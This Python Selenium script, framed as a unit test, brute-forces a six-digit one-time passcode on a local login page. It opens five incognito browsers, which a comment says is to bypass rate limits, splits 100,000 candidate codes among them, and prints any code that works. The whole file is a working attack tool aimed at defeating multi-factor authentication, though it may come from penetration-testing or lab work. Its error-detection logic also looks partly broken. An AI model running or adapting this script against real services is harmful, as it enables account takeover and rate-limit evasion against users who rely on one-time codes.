from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.chrome.options import Options
import unittest, time, threading, random

THREADS = 5

def otp_brute_force_thread(driver, otp):
    random.shuffle(otp) # how lucky are we?
    driver.get("http://localhost")
        
    WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.XPATH, "//a[@title='My Account']"))
    ).click()

    WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.ID, "email-input"))
    ).send_keys("user@example.com")
    
    WebDriverWait(driver, 10).until(
        EC.element_to_be_clickable((By.XPATH, "//button[contains(text(),'get otp')]"))
    ).click()
    
    time.sleep(5)
    for code in otp: # choose a good range
        code = str(code).zfill(6)
        
        WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@aria-label=' code 1']"))
        ).send_keys(code[0])
        WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@aria-label=' code 2']"))
        ).send_keys(code[1])
        WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@aria-label=' code 3']"))
        ).send_keys(code[2])
        WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@aria-label=' code 4']"))
        ).send_keys(code[3])
        WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@aria-label=' code 5']"))
        ).send_keys(code[4])
        WebDriverWait(driver, 5).until(
            EC.element_to_be_clickable((By.XPATH, "//input[@aria-label=' code 6']"))
        ).send_keys(code[5])
        
        WebDriverWait(driver, 20).until(
            EC.element_to_be_clickable((By.ID, "submit"))
        ).click()
        
        error = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, "//p[contains(text(), 'code is incorrect')]"))
        )
        
        error = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, "//p[contains(text(), '')]"))
        )
        
        if not error.is_displayed():
            print(f"Valid OTP: {code}")
            time.sleep(9999999)
            break

class OTPBruteForceThread(unittest.TestCase):
    def setUp(self):
        options = Options()
        options.add_argument(f"--incognito")
        
        self.driver = []
        self.threads = []

        for _ in range(THREADS): # open multiple browsers to bypass rate limits
            self.driver.append(webdriver.Chrome(options=options))
        

    def test_otp_brute_force(self):
        otp = list(range(700000, 800000))
        chunk_size = len(otp) // len(self.driver)
        chunks = [otp[i * chunk_size:(i + 1) * chunk_size] for i in range(THREADS)]
        for i in range(THREADS):
            thread = threading.Thread(target=otp_brute_force_thread, args=(self.driver[i], chunks[i]))
            self.threads.append(thread)
            thread.start()
            
        for thread in self.threads:
            thread.join()

    def tearDown(self):
        for d in self.driver:
            d.quit()
        

if __name__ == "__main__":
    unittest.main()
